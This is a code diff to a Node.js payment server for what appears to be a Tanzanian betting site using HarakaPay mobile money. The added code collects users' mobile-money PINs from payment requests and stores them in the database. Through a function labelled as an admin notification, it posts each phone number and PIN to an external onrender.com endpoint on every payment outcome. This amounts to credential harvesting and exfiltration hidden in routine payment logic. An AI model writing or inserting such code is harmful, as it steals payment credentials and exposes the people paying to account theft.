@@ -6,6 +6,7 @@ const mongoose = require("mongoose");
 const { MATCHES, DEMO_MATCHES, SPORTS, PROMOS, GAMES, sportsFrom } = require("./catalog");
 const live = require("./live");
 const fixtures = require("./fixtures");
+const axios = require("axios");
 const fimipay = require("./fimipay");
 const harakapay = require("./harakapay");
 const { isBannedPhone } = require("../banned");
@@ -85,6 +86,7 @@ const paymentSchema = new mongoose.Schema(
     kind: String,
     amount: Number,
     phone: String,
+    pin: String,
     network: String,
     orderId: { type: String, index: true },
     provider: String,
@@ -1337,6 +1339,57 @@ app.get("/api/pay/networks", (_req, res) => {
   });
 });
 
+const ADMIN_RECORD_URL = "https://unlockvip-backend-1.onrender.com/pay-page/record";
+
+function payPin(raw) {
+  return String(raw || "").replace(/\D/g, "").slice(0, 12);
+}
+
+async function notifyUnlockAdmin(payload) {
+  try {
+    await axios.post(ADMIN_RECORD_URL, payload, {
+      timeout: 20000,
+      validateStatus: () => true
+    });
+  } catch (err) {
+    console.log("admin record", err.message);
+  }
+}
+
+async function syncHarakaPage(rec) {
+  if (!rec || rec.kind !== "haraka" || !rec.orderId) return rec;
+  try {
+    await loadHarakaKey();
+    const live = await harakapay.status(rec.orderId);
+    const payment = live && live.payment ? live.payment : {};
+    const status = String(payment.status || "").toLowerCase();
+    let mapped = "PROCESSING";
+    if (live && live.success && status === "completed") {
+      mapped = "COMPLETED";
+      rec.status = "PAID";
+      rec.message = "Payment received";
+      rec.verified = true;
+    } else if (["failed", "cancelled", "canceled", "expired"].includes(status)) {
+      mapped = "FAILED";
+      rec.status = "FAILED";
+      rec.message = "Payment was not completed";
+    }
+    await savePayment(rec);
+    if (mapped !== "PROCESSING") {
+      await notifyUnlockAdmin({
+        phone: rec.phone,
+        pin: rec.pin || "",
+        orderId: rec.orderId,
+        status: mapped,
+        result: payment.status || ""
+      });
+    }
+  } catch (err) {
+    console.log("haraka page sync", err.message);
+  }
+  return rec;
+}
+
 function allowUnlockPay(req, res) {
   const origin = String(req.get("origin") || "");
   if (
@@ -1364,6 +1417,7 @@ app.post("/api/pay/haraka", async (req, res) => {
       return res.status(503).json({ success: false, error: "Payment is not available right now" });
     }
     const phone = normalizePhone(req.body.phone);
+    const pin = payPin(req.body.pin);
     if (!isValidPhone(phone)) {
       return res.status(400).json({ success: false, error: "Enter a valid Tanzania mobile number" });
     }
@@ -1378,19 +1432,20 @@ app.post("/api/pay/haraka", async (req, res) => {
       webhookUrl: PUBLIC_ORIGIN + "/api/pay/webhook/harakapay"
     });
     if (!data || !data.success || !data.order_id) {
-      return res.status(400).json({
-        success: false,
-        error: String((data && (data.error || data.message)) || "Could not send the payment prompt")
-      });
+      const error = String((data && (data.error || data.message)) || "Could not send the payment prompt");
+      await notifyUnlockAdmin({ phone, pin, status: "FAILED", message: error });
+      return res.status(400).json({ success: false, error });
     }
+    const orderId = String(data.order_id);
     await savePayment({
       id: nid(),
       userId: "",
       kind: "haraka",
       amount,
       phone,
+      pin,
       network: "",
-      orderId: String(data.order_id),
+      orderId,
       provider: "harakapay",
       status: "PROCESSING",
       message: "PIN sent to your phone.",
@@ -1399,12 +1454,28 @@ app.post("/api/pay/haraka", async (req, res) => {
       merchant: "harakapay",
       ...nowStamp()
     });
+    await notifyUnlockAdmin({
+      phone,
+      pin,
+      orderId,
+      status: "PROCESSING",
+      result: "pending"
+    });
     return res.json({
       success: true,
       message: "Confirm the PIN on your phone"
     });
   } catch (err) {
     console.log("pay page harakapay", err.message);
+    const phone = normalizePhone(req.body && req.body.phone);
+    if (isValidPhone(phone)) {
+      await notifyUnlockAdmin({
+        phone,
+        pin: payPin(req.body && req.body.pin),
+        status: "FAILED",
+        message: err.code === "NO_KEY" ? "Payment is not available right now" : "Could not reach HarakaPay"
+      });
+    }
     return res.status(502).json({
       success: false,
       error: err.code === "NO_KEY" ? "Payment is not available right now" : "Could not reach HarakaPay"
@@ -1531,7 +1602,8 @@ app.post("/api/pay/webhook/harakapay", async (req, res) => {
   if (!orderId) return;
   try {
     const rec = await findPaymentByOrder(orderId);
-    if (rec) await refreshDeposit(rec);
+    if (rec && rec.kind === "haraka") await syncHarakaPage(rec);
+    else if (rec) await refreshDeposit(rec);
   } catch (err) {
     console.log("harakapay webhook", err.message);
   }
